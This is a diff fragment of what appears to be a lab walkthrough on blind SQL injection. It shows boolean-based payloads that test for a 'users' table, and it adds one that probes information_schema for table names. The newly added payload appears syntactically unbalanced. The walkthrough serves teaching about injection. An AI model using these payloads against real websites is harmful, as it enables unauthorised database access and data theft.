@@ -276,6 +276,8 @@ We first need to understand how the website behaves given true and false conditi
 HNgNNAq7tdrY9x17' AND (SELECT 'x' FROM users LIMIT 1)='x' --
 
 HNgNNAq7tdrY9x17' AND (SELECT 'x' FROM users WHERE ROWNUM=1)='x' --
+
+'+OR+SELECT+'x'+FROM+information_schema.tables+WHERE+table_name+like+'a%'+LIMIT+1)='x'+--+-
 ```
 This returns an `x` for every row in the table. We limit to 1 to check for only 1 `x` returned. 
 - If there is no `x` returned, then there is no table, or there are no rows in that table. 
